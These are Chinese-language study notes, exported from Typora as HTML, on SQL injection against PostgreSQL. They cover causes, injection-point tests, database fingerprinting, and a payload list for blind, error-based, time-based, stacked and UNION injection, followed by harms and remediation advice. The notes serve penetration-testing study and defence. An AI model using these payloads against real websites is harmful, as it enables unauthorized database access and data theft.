<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<link rel='stylesheet' href='../../../plugins/googleapis/fonts.css'>
<link rel="stylesheet" href="../../../dist/css/markdown.css">
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><ul><li><p><strong><span>什么是SQL注入</span></strong></p><p><span>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</span></p></li></ul><p></br></p><ul><li><p><strong><span>产生SQL注入的主要原因</span></strong></p><p><span>1、在编写时未对用户提交至服务器的数据进行合法性校验（类型、长度、业务参数合法性、敏感字符等）。</span></p><p><span>2、未对用户可控参数进行足够的过滤便将参数内容直接以拼接的方式进入到SQL语句中。</span></p></li></ul><p></br></p><ul><li><p><strong><span>常见的注入数据库</span></strong></p><p><span>Mysql、Mssql(Sql Server)、Oracle、PostgreSql</span></p></li></ul><p></br></p><ul><li><p><strong><span>通用注入手法</span></strong></p><p><span>联合查询、报错注入、布尔盲注、时间盲注、堆叠查询、宽字节注入、二次注入……</span></p></li></ul><p></br></p><ul><li><p><strong><span>通用注入点测试</span></strong></p><figure><table><thead><tr><th><span>类型</span></th><th><span>语句和结果</span></th></tr></thead><tbody><tr><td><span>特殊字符测试</span></td><td><span>id=&#39;)&quot;) ==&gt; 抛出异常</span></td></tr><tr><td><span>逻辑运算测试</span></td><td><span>id=&#39; and 2</span><em><span>3 = 6 -- ==&gt; True  </span><br /><span>id=&#39; and 2</span></em><span>3 = 5 -- ==&gt; False  </span><br /><span>id=2*3 ==&gt; 是否返回id=6相关的内容  </span><br /><span>id=1/1 ==&gt; True  </span><br /><span>id=1/0 ==&gt; False或者异常</span></td></tr><tr><td><span>延时注入测试</span></td><td><span>id=&#39; and sleep(5) ==&gt; 延时5秒甚至更久 </span><br /><span>需要根据特定的数据库函数来判断，见时间盲注</span></td></tr></tbody></table></figure></li></ul><p></br></p><ul><li><p><strong><span>Postgresql数据库特征</span></strong></p><ol start='' ><li><p><span>常见代码与Postgresql的组合：php+Postgresql；python+Postgresql</span></p></li><li><p><span>默认端口信息：5432</span></p></li><li><p><span>数据库特有函数：</span></p><ul><li><p><span>特有用法：select extract(dow from now())</span></p></li><li><p><span>延迟函数：pg_sleep()</span></p></li></ul></li><li><p><span>返回的错误类型：</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="mysql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="mysql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Cause<span class="cm-punctuation">:</span>org<span class="cm-variable-2">.postgresql.util.PSQLException</span><span class="cm-punctuation">:</span>ERROR<span class="cm-punctuation">:</span>syntax error <span class="cm-keyword">at</span> <span class="cm-keyword">end</span> of input</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERROR<span class="cm-punctuation">:</span> unterminated quoted string <span class="cm-keyword">at</span> <span class="cm-keyword">or</span> near <span class="">'...'</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 46px;"></div><div class="CodeMirror-gutters" style="display: none; height: 46px;"></div></div></div></pre></li><li><p><span>查询特有表：</span></p><ul><li><p><code>?id=1 and (select count(*) from Pg_database)&gt;0 and 1=1</code></p></li><li><p><code>?id=1 and (select count(*) from information_schema.TABLES)&gt;0 and 1=1</code><span>（继承自Mysql）</span></p></li></ul></li><li><p><span>补充：</span></p><ul><li><p><span>注释符：--；/</span></p></li><li><p><span>查询函数：version()；user；current_database()</span></p></li><li><p><span>获取所有数据库：select datname from pg_database</span></p></li></ul></li></ol></li></ul><p></br></p><ul><li><p><strong><span>测试Payload（以字符型注入为例）</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="python" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###### 测试字段数</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">1</span><span class="">' order by 3--+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###### 盲注数据库名</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">'and ascii(substring((select current_database()),1,1))=116</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###### 报错注入</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">1.</span> <span class="cm-variable">CAST</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">' and cast((select version()) as int)=1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">2.</span> ::<span class="cm-variable">运算符</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">' and (select version()::text::int)=1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###### 延时注入/盲注</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># pg_sleep()；pg_sleep_for(interval)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">'and (select pg_sleep_for('</span><span class="">5</span> <span class="cm-variable">sec</span><span class="">')) is null</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">'and (select pg_sleep_for('</span><span class="">5</span> <span class="cm-variable">sec</span><span class="">'))=1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">';select pg_sleep_for('</span><span class="">5</span> <span class="cm-variable">sec</span><span class="">')</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###### 盲注当前数据库</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="cm-variable">a</span><span class="">' and (select case when((ascii(substring((select current_database()),1,1))) = 116) then pg_sleep(5) else null end) is null</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###### 联合注入：</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="">?</span><span class="">id</span><span class="">=</span><span class="">1</span><span class="">' union select '</span><span class="">1</span><span class="">',version(),'</span><span class="">3</span><span class="">'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">更多Payload参考笔记</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 760px;"></div><div class="CodeMirror-gutters" style="display: none; height: 760px;"></div></div></div></pre></li></ul><p></br></p><ul><li><p><strong><span>SQL注入笔记</span></strong></p><ol start='' ><li><p><a href='https://pentestmonkey.net/category/cheat-sheet/sql-injection' target="_blank"><span>pentestmonkey</span></a></p></li><li><p><a href='https://sqlwiki.netspi.com/' target="_blank"><span>sqlwiki</span></a></p></li><li><p><a href='https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/01.SQL%E6%B3%A8%E5%85%A5/' target="_blank"><span>d4m1ts知识库-SQL注入</span></a></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>SQL注入的危害</span></strong></p><ol start='' ><li><p><span>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</span></p></li><li><p><span>网页篡改：通过操作数据库对特定网页进行篡改。</span></p></li><li><p><span>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</span></p></li><li><p><span>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</span></p></li><li><p><span>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</span></p></li><li><p><span>破坏硬盘数据，瘫痪全系统。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>修复建议</span></strong></p><ol start='' ><li><p><span>代码层面</span></p><ul><li><p><span>对输入进行严格的转义和过滤</span></p></li><li><p><span>使用参数化查询和PDO预处理</span></p></li></ul></li><li><p><span>数据库层面</span></p><ul><li><p><span>最小权限原则</span></p></li><li><p><span>禁用敏感函数和高危函数</span></p></li><li><p><span>统一网站与数据库的编码</span></p></li></ul></li><li><p><span>其他层面</span></p><ul><li><p><span>使用WAF、IPS等监测设备</span></p></li><li><p><span>统一报错信息，防止数据库报错</span></p></li></ul></li></ol></li></ul><p></br></p><ul><li><p><strong><span>推荐学习文章</span></strong></p><ol start='' ><li><p><a href='https://xz.aliyun.com/t/8621' target="_blank"><span>先知-SQL注入渗透PostgreSQL(bypass tricks)</span></a></p></li><li><p><a href='https://www.cnblogs.com/yilishazi/p/14710349.html' target="_blank"><span>PostGresql 注入知识汇总</span></a></p></li><li><p><a href='https://blog.csdn.net/qq_36119192/article/details/104628797' target="_blank"><span>CSDN-PostgreSQL数据库的注入</span></a></p></li></ol></li></ul></div></div>
</body>
</html>